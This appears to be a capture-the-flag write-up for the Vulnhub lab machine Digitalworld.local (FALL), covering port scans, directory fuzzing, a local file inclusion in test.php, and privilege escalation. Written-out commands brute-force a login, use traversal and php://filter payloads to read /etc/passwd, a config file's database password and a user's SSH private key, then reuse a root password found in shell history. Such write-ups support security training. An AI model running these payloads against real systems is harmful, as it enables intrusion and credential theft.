---
title: Vulnhub - Digitalworld.local (FALL)
categories: [Vulnhub, Linux]
date: 2022-02-09
tags: [ exploit/file-inclusion/lfi, linux-priv-esc/linux-creds-found ]
img_path: /Writeups/Vulnhub/Linux/Digitalworld.local (FALL)/images/
image: 
  src: fall.jpg
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Recon

## NMAP Complete Scan

```
# Nmap 7.92 scan initiated Tue Feb  8 17:14:08 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Digitalworld.local-FALL/192.168.110.20/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Digitalworld.local-FALL/192.168.110.20/scans/xml/_full_tcp_nmap.xml 192.168.110.20
Nmap scan report for 192.168.110.20
Host is up, received arp-response (0.0010s latency).
Scanned at 2022-02-08 17:14:09 +08 for 246s
Not shown: 65367 filtered tcp ports (no-response), 155 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE     REASON         VERSION
22/tcp    open   ssh         syn-ack ttl 64 OpenSSH 7.8 (protocol 2.0)
| ssh-hostkey: 
|   2048 c5:86:f9:64:27:a4:38:5b:8a:11:f9:44:4b:2a:ff:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBezJ/KDio6Fwya44wrK4/39Vd93TBRE3CC7En4GJYCcT89paKDGhozzWU7pAFV5FqWbBZ5Z9pJIGhVNvmIIYR1YoyTbkF3qbf41XBGCmI87nLqYxFXQys3iycBYah3qMxkr24N4SvU+OIOWItFQZSNCK3BzYlCnxFNVNh4JLqrI/Og40EP5Ck7REorRRIraefdROKDqZHPeugwV1UHbISjyDsKChbpobQxVl80RT1dszhuUU1BvhJl1sy/opLQWdRjsl97L1c0lc87AFcd6PgsGf6UFURN+1RaVngnZBFWWnYUb/HfCbKJGseTgATk+Fk5+IBOrlXJ4fQ9/SkagXL
|   256 e1:00:0b:cc:59:21:69:6c:1a:c1:77:22:39:5a:35:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAFLZltNl1U6p8d7Su4gH+FQmIRRpZlAuOHrQYHYdGeWADfzBXlPSDkCrItb9doE6+ACyru5Fm023LgiTNg8yGU=
|   256 1d:4e:14:6d:20:f4:56:da:65:83:6f:7d:33:9d:f0:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEeQTBvJOPKDtUv+nJyQJ9rKdAmrC577XXaTjRI+2n3c
80/tcp    open   http        syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
| http-robots.txt: 1 disallowed entry 
|_/
111/tcp   closed rpcbind     reset ttl 64
139/tcp   open   netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp   open   ssl/http    syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain/organizationalUnitName=ca-2683772458131447713
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-08-15T03:51:33
| Not valid after:  2020-08-19T05:31:33
| MD5:   ac51 22da 893a 4d95 07ba 3e82 5780 bf24
| SHA-1: 8821 fdc6 7f1b ac6a 2c7b 6a32 194d ed44 b553 2cf4
| -----BEGIN CERTIFICATE-----
| MIIE4DCCAsigAwIBAgIIV5TaF3XKfxowDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV
| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMjY4Mzc3
| MjQ1ODEzMTQ0NzcxMzEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0xOTA4
| MTUwMzUxMzNaFw0yMDA4MTkwNTMxMzNaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK
| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKY2vdPnY38fq4HuMzEIZwz2PfMutxbg
| xdxMBJMk8eM9vwwMmDyiMuEMfy46w5gvCgo5zmq4VoQYKJxrcUIogiDqzLC/Pjfq
| jSvFooDih5naltrhaoZvTHlu8Q4G0TmwhaaYpedqkhPzVLHywkckVBu9P9unrrlI
| BI3+N3aZLTppsk1gTe67tUjhpeiMQKkYWhtgTG3upSAI9FjsB9LNhw8CyIM+VFHj
| 2YHFlvp+Jt1A+u+vMtfDm5A86/MpdeWpLKbLTjgNk0Q79VPU0UBnoSKcS2RwAVRM
| QkR3lLoOEGu/DLz84EQP1r9m5jLZX5p5Gc0qaa9/FG3ll9DLRL+gggsCAwEAAaNg
| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo
| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFNch7n7MGaSjmr7qLPAGmH5iWQnd
| MA0GCSqGSIb3DQEBCwUAA4ICAQBxLU3j7e5B47e3oO7dHrZrl6fTxAPORYcPWM19
| Qjwq4wBluFliGz918zGukOrDQdb2WEhbJj1X2SNsLhqa6i/nEi+GKQ7XzMwpOxTg
| vY3bFV1y550Uac/kj6lSXLIgRllLruuQOOLHsfz9BhTe5ZbSO0N20XhvHqhxbd6s
| EBqKZeSbnweXnHUeiev/7IceZaxoWHqJ4CfM1PUXnJZL+NuWGPAfzMfv5F7ap66T
| d1bc9xBvg9jbvP4RtmGT0QwpUTCpsXBLS3WuZjq9/jcxvyubwVfIidGCMGoiGNqy
| pHI+XgYH3f/9W56QgxuUIjctLTeU8v5YZlS7vw58whxaZ0j3xQd50RZ+YFPTXnsy
| L2oAOZ8Lb57SKMM/RKYju5cvSQjtTRz+KnHqZHwDA46b2WKOUONrlNvm7Hp0dICB
| RLfD150FOj8L914sNFh85M2Sj1BFHKDSNu9ootIZg0uUxwJNGrOuzY0vlRiAJTOA
| Sw3FNGWb1UWyAXjO1DGL2YEnW2phXMdml4MttR6HoDgw689ra0q67xNWRyNOEc00
| OdANMqq4PpF3W58/o8zRriePTQiGYltb95DUS5skFm/ScJ9PvElefLn5MkgnhKEC
| htGW8shfB4Rhc9r+03JJpflvJ48EtS/TikQNTyO4B9p1bEguRVbWzx6Tf/rLEYdb
| GBMBjA==
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A
445/tcp   open   netbios-ssn syn-ack ttl 64 Samba smbd 4.8.10 (workgroup: SAMBA)
3306/tcp  open   mysql       syn-ack ttl 64 MySQL (unauthorized)
8000/tcp  closed http-alt    reset ttl 64
8080/tcp  closed http-proxy  reset ttl 64
8443/tcp  closed https-alt   reset ttl 64
9090/tcp  open   http        syn-ack ttl 64 Cockpit web service 162 - 188
|_http-title: Did not follow redirect to https://192.168.110.20:9090/
| http-methods: 
|_  Supported Methods: GET HEAD
10080/tcp closed amanda      reset ttl 64
10443/tcp closed cirrossp    reset ttl 64
MAC Address: 08:00:27:A2:80:57 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.4
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/8%OT=22%CT=111%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=62
OS:023557%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=
OS:A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5
OS:B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE8
OS:8)ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 26.164 days (since Thu Jan 13 13:22:17 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-02-08T17:17:17
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 10h40m00s, deviation: 4h37m09s, median: 7h59m58s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.8.10)
|   Computer name: fall
|   NetBIOS computer name: FALL\x00
|   Domain name: \x00
|   FQDN: fall
|_  System time: 2022-02-08T09:17:20-08:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25200/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 39619/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 47728/udp): CLEAN (Timeout)
|   Check 4 (port 52999/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE
HOP RTT     ADDRESS
1   1.05 ms 192.168.110.20

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb  8 17:18:15 2022 -- 1 IP address (1 host up) scanned in 247.67 seconds
```

## TCP/80 (HTTP)

### FFUF - common.txt

```
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL]
└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.20/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

admin                   [Status: 301, Size: 236, Words: 14, Lines: 8]
admin.cgi.html          [Status: 403, Size: 223, Words: 16, Lines: 10]
admin.cgi               [Status: 403, Size: 218, Words: 16, Lines: 10]
admin.cgi.txt           [Status: 403, Size: 222, Words: 16, Lines: 10]
admin.pl                [Status: 403, Size: 217, Words: 16, Lines: 10]
admin.pl.html           [Status: 403, Size: 222, Words: 16, Lines: 10]
admin.pl.txt            [Status: 403, Size: 221, Words: 16, Lines: 10]
assets                  [Status: 301, Size: 237, Words: 14, Lines: 8]
AT-admin.cgi            [Status: 403, Size: 221, Words: 16, Lines: 10]
AT-admin.cgi.html       [Status: 403, Size: 226, Words: 16, Lines: 10]
AT-admin.cgi.txt        [Status: 403, Size: 225, Words: 16, Lines: 10]
cachemgr.cgi.html       [Status: 403, Size: 226, Words: 16, Lines: 10]
cachemgr.cgi.txt        [Status: 403, Size: 225, Words: 16, Lines: 10]
cachemgr.cgi            [Status: 403, Size: 221, Words: 16, Lines: 10]
cgi-bin/                [Status: 403, Size: 217, Words: 16, Lines: 10]
cgi-bin/.html           [Status: 403, Size: 222, Words: 16, Lines: 10]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
doc                     [Status: 301, Size: 234, Words: 14, Lines: 8]
error.html              [Status: 200, Size: 80, Words: 3, Lines: 6]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 3]
index.php               [Status: 200, Size: 8385, Words: 1138, Lines: 296]
index.php               [Status: 200, Size: 8385, Words: 1138, Lines: 296]
lib                     [Status: 301, Size: 234, Words: 14, Lines: 8]
missing.html            [Status: 200, Size: 168, Words: 17, Lines: 7]
modules                 [Status: 301, Size: 238, Words: 14, Lines: 8]
phpinfo.php             [Status: 200, Size: 17, Words: 3, Lines: 2]
phpinfo.php             [Status: 200, Size: 17, Words: 3, Lines: 2]
robots.txt              [Status: 200, Size: 79, Words: 9, Lines: 8]
robots.txt              [Status: 200, Size: 79, Words: 9, Lines: 8]
test.php                [Status: 200, Size: 80, Words: 3, Lines: 6]
tmp                     [Status: 301, Size: 234, Words: 14, Lines: 8]
uploads                 [Status: 301, Size: 238, Words: 14, Lines: 8]
:: Progress: [18460/18460] :: Job [1/1] :: 633 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```

- `admin`
- `assets`
- `error.html`
- `index.php`
- `missing.html`
- `test.php`
- `uploads`
- `config.php`

## TCP/443 (HTTPS)

- Same results as `TCP/80`

## TCP/9090 (HTTP)

### FFUF - common.txt

```
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL]
└─# ffuf -u http://$ip:9090/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.cgi'  -fw 8876,3

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.20:9090/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php .cgi 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 8876,3
________________________________________________

favicon.ico             [Status: 200, Size: 413, Words: 1, Lines: 4]
ping                    [Status: 200, Size: 24, Words: 4, Lines: 1]
:: Progress: [23075/23075] :: Job [1/1] :: 908 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

- `ping`

### NMAP

```
PORT     STATE SERVICE REASON         VERSION
9090/tcp open  http    syn-ack ttl 64 Cockpit web service 162 - 188
```

- `Cockpit web service 162 - 188`

## TCP/139,445 (SMB)

### Enum4linux

- No users enumerated

### SMBMap

```
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20]
└─# smbmap -H $ip
[+] IP: 192.168.110.20:445	Name: 192.168.110.20                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.8.10)
```

- No access to any fileshare

# Initial Foothold

## TCP/80 (HTTP) - LFI (Include config.php, failed)

1. View enumerated directories
	- `admin`
		![](Pasted%20image%2020220208175256.png)
	- `assets`, `modules`
		- Contains files for the CMS
	- `index.php`
		![](Pasted%20image%2020220208175534.png)
		- `CMS Made Simple v2.2.15`
		- There could be backdoors in the webserver
	- `test.php`
		![](Pasted%20image%2020220208174904.png)
		- `GET` parameter missing
	- `missing.html`
		![](Pasted%20image%2020220208174506.png)
		- `patrick`
2. Intercept `test.php` w/ burp
	![](Pasted%20image%2020220208180001.png)
	- javascript `alert('Missing GET parameter')`
3. Search exploits for `CMS Made Simple v2.2.15`
	

	| Exploit Title                                | Pat                   |

	| -------------------------------------------- | --------------------- |

	| CMS Made Simple 2.2.15 - RCE (Authenticated) | php/webapps/49345.txt | 

	- Requires authentication
4. Tried to bruteforce `/admin.php`, failed

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
	└─# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" -V
	```

5. Fuzz for LFI vulnerability at `test.php?<Get Parameter>=<LFI>`

	```
	┌──(root💀kali)-[/usr/share/wordlists]
	└─# ffuf -u http://$ip/test.php?W1=W2 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:W1 -w /usr/share/wordlists/LFI/file_inclusion_linux.txt:W2  -fw 3

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.20/test.php?W1=W2
	 :: Wordlist         : W1: /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
	 :: Wordlist         : W2: /usr/share/wordlists/LFI/file_inclusion_linux.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 3
	________________________________________________

	[Status: 200, Size: 0, Words: 1, Lines: 1]
		* W1: file
		* W2: %00../../../../../../etc/passwd

	[Status: 200, Size: 0, Words: 1, Lines: 1]
		* W2: %00../../../../../../etc/shadow
		* W1: file

	[Status: 200, Size: 0, Words: 1, Lines: 1]
		* W1: file
		* W2: %00/etc/passwd%00

	[Status: 200, Size: 0, Words: 1, Lines: 1]
		* W1: file
		* W2: %00/etc/shadow%00

	[WARN] Caught keyboard interrupt (Ctrl-C)
	```

	![](Pasted%20image%2020220208190041.png)

6. Include files that can lead to RCE
	1. Enumerate files that can lead to RCE
		- Did not find any log files we can poison
	2. Earlier, during reconaissance phase, we enumerated `config.php`, `config.php` contains SQL credentials where we could access mysql at `TCP/3306` to obtain user credentials.
		- [`config.php` details](https://docs.cmsmadesimple.org/configuration/config-file)
	3. View source code of `config.php` using `PHP Wrapper, php://filter`
	4. Check if `php://filter` works, by including files that we know exists

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
		└─# curl -s http://192.168.110.20/test.php?file=php://filter/convert.base64-encode/resource=../../../../../etc/passwd | base64 -d
		root:x:0:0:root:/root:/bin/bash
		bin:x:1:1:bin:/bin:/sbin/nologin
		daemon:x:2:2:daemon:/sbin:/sbin/nologin
		adm:x:3:4:adm:/var/adm:/sbin/nologin
		lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
		sync:x:5:0:sync:/sbin:/bin/sync
		shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
		halt:x:7:0:halt:/sbin:/sbin/halt
		mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
		operator:x:11:0:operator:/root:/sbin/nologin
		games:x:12:100:games:/usr/games:/sbin/nologin
		ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
		nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
		systemd-coredump:x:999:996:systemd Core Dumper:/:/sbin/nologin
		systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
		systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
		dbus:x:81:81:System message bus:/:/sbin/nologin
		polkitd:x:998:995:User for polkitd:/:/sbin/nologin
		sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
		cockpit-ws:x:997:993:User for cockpit-ws:/:/sbin/nologin
		rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
		ntp:x:38:38::/etc/ntp:/sbin/nologin
		abrt:x:173:173::/etc/abrt:/sbin/nologin
		rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
		chrony:x:996:991::/var/lib/chrony:/sbin/nologin
		tcpdump:x:72:72::/:/sbin/nologin
		qiu:x:1000:1000:qiu:/home/qiu:/bin/bash
		apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
		nginx:x:995:990:Nginx web server:/var/lib/nginx:/sbin/nologin
		tss:x:59:59:Account used by the tpm2-abrmd package to sandbox the tpm2-abrmd daemon:/dev/null:/sbin/nologin
		clevis:x:994:989:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
		mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
		```

	5. Include `config.php`

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
		└─# curl -s http://192.168.110.20/test.php?file=php://filter/convert.base64-encode/resource=config.php | base64 -d
		<?php
		# CMS Made Simple Configuration File
		# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
		#
		$config['dbms'] = 'mysqli';
		$config['db_hostname'] = '127.0.0.1';
		$config['db_username'] = 'cms_user';
		$config['db_password'] = 'P@ssw0rdINSANITY';
		$config['db_name'] = 'cms_db';
		$config['db_prefix'] = 'cms_';
		$config['timezone'] = 'Asia/Singapore';
		$config['db_port'] = 3306;
		?>
		```

		- cms_user:`P@ssw0rdINSANITY`

## TCP/3306 (MySQL) - Unable to connect

1. Access mysql w/ cms_user:`P@ssw0rdINSANITY`

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
	└─# mysql -u cms_user -h $ip
	ERROR 1130 (HY000): Host '192.168.110.4' is not allowed to connect to this MySQL server
	```

	-  Unable to connect to MySQL

## TCP/80 (HTTP) - LFI (Include id_rsa)

1. Only option we did not try is to include `id_rsa` 

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
	└─# curl -s http://192.168.110.20/test.php?file=../../../../home/qiu/.ssh/id_rsa | tee id_rsa
	-----BEGIN OPENSSH PRIVATE KEY-----
	b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
	NhAAAAAwEAAQAAAQEAvNjhOFOSeDHy9K5vnHSs3qTjWNehAPzT0sD3beBPVvYKQJt0AkD0
	FDcWTSSF13NhbjCQm5fnzR8td4sjJMYiAl+vAKboHne0njGkBwdy5PgmcXyeZTECIGkggX
	61kImUOIqtLMcjF5ti+09RGiWeSmfIDtTCjj/+uQlokUMtdc4NOv4XGJbp7GdEWBZevien
	qXoXtG6j7gUgtXX1Fxlx3FPhxE3lxw/AfZ9ib21JGlOyy8cflTlogrZPoICCXIV/kxGK0d
	Zucw8rGGMc6Jv7npeQS1IXU9VnP3LWlOGFU0j+IS5SiNksRfdQ4mCN9SYhAm9mAKcZW8wS
	vXuDjWOLEwAAA9AS5tRmEubUZgAAAAdzc2gtcnNhAAABAQC82OE4U5J4MfL0rm+cdKzepO
	NY16EA/NPSwPdt4E9W9gpAm3QCQPQUNxZNJIXXc2FuMJCbl+fNHy13iyMkxiICX68Apuge
	d7SeMaQHB3Lk+CZxfJ5lMQIgaSCBfrWQiZQ4iq0sxyMXm2L7T1EaJZ5KZ8gO1MKOP/65CW
	iRQy11zg06/hcYlunsZ0RYFl6+J6epehe0bqPuBSC1dfUXGXHcU+HETeXHD8B9n2JvbUka
	U7LLxx+VOWiCtk+ggIJchX+TEYrR1m5zDysYYxzom/uel5BLUhdT1Wc/ctaU4YVTSP4hLl
	KI2SxF91DiYI31JiECb2YApxlbzBK9e4ONY4sTAAAAAwEAAQAAAQArXIEaNdZD0vQ+Sm9G
	NWQcGzA4jgph96uLkNM/X2nYRdZEz2zrt45TtfJg9CnnNo8AhhYuI8sNxkLiWAhRwUy9zs
	qYE7rohAPs7ukC1CsFeBUbqcmU4pPibUERes6lyXFHKlBpH7BnEz6/BY9RuaGG5B2DikbB
	8t/CDO79q7ccfTZs+gOVRX4PW641+cZxo5/gL3GcdJwDY4ggPwbU/m8sYsyN1NWJ8NH00d
	X8THaQAEXAO6TTzPMLgwJi+0kj1UTg+D+nONfh7xeXLseST0m1p+e9C/8rseZsSJSxoXKk
	CmDy69aModcpW+ZXl9NcjEwrMvJPLLKjhIUcIhNjf4ABAAAAgEr3ZKUuJquBNFPhEUgUic
	ivHoZH6U82VyEY2Bz24qevcVz2IcAXLBLIp+f1oiwYUVMIuWQDw6LSon8S72kk7VWiDrWz
	lHjRfpUwWdzdWSMY6PI7EpGVVs0qmRC/TTqOIH+FXA66cFx3X4uOCjkzT0/Es0uNyZ07qQ
	58cGE8cKrLAAAAgQDlPajDRVfDWgOWJj+imXfpGsmo81UDaYXwklzw4VM2SfIHIAFZPaA0
	acm4/icKGPlnYWsvZCksvlUck+ti+J2RS2Mq9jmKB0AVZisFazj8qIde3SPPwtR7gBR329
	JW3Db+KISMRIvdpJv+eiKQLg/epbSdwXZi0DJoB0a15FsIAQAAAIEA0uQl0d0p3NxCyT/+
	Q6N+llf9TB5+VNjinaGu4DY6qVrSHmhkceHtXxG6h9upRtKw5BvOlSbTatlfMZYUtlZ1mL
	RWCU8D7v1Qn7qMflx4bldYgV8lf18sb6g/uztWJuLpFe3Ue/MLgeJ+2TiAw9yYoPVySNK8
	uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC
	-----END OPENSSH PRIVATE KEY-----
	```

2. Obtain usernames

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
	└─# curl -s http://192.168.110.20/test.php?file=../../../../etc/passwd | awk -F: '($3>=1000)&&($1!="nobody"){print $1}' | tee usernames.txt
	qiu
	```

3. Fuzz for user's `id_rsa`

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
	└─# ffuf -u http://$ip/test.php?file=../../../../../../home/FUZZ/.ssh/id_rsa -w usernames.txt

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.20/test.php?file=../../../../../../home/FUZZ/.ssh/id_rsa
	 :: Wordlist         : FUZZ: usernames.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________

	qiu                     [Status: 200, Size: 1831, Words: 7, Lines: 28]
	:: Progress: [1/1] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
	```

4. Change permissions of `id_rsa`

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
	└─# chmod 600 id_rsa 
	```

## TCP/22 (SSH)

1. SSH w/ qiu's `id_rsa`
![](Pasted%20image%2020220208200210.png)
2. Local Flag

	```
	[qiu@FALL ~]$ cat local.txt 
	A low privilege shell! :-)
	[qiu@FALL ~]$ 
	```

# Privilege Escalation

## Root - Via Creds Found

1. View files in qiu's home directory
2. View `.bash_history`

	```
	[qiu@FALL ~]$ cat .bash_history 
	ls -al
	cat .bash_history 
	rm .bash_history
	echo "remarkablyawesomE" | sudo -S dnf update
	ifconfig
	ping www.google.com
	ps -aux
	ps -ef | grep apache
	env
	env > env.txt
	rm env.txt
	lsof -i tcp:445
	lsof -i tcp:80
	ps -ef
	lsof -p 1930
	lsof -p 2160
	rm .bash_history
	exit
	ls -al
	cat .bash_history
	exit
	id;whoami
	sudo -l
	ls
	cat local.txt 
	[qiu@FALL ~]$ cd ..
	```

	- root:`remarkablyawesomE`
3. Obtain root shell
	![](Pasted%20image%2020220208204223.png)
4. Root Flag

	```
	[root@FALL ~]# cat proof.txt 
	Congrats on a root shell! :-)
	[root@FALL ~]# cat remarks.txt 
	Hi!

	Congratulations on rooting yet another box in the digitalworld.local series!

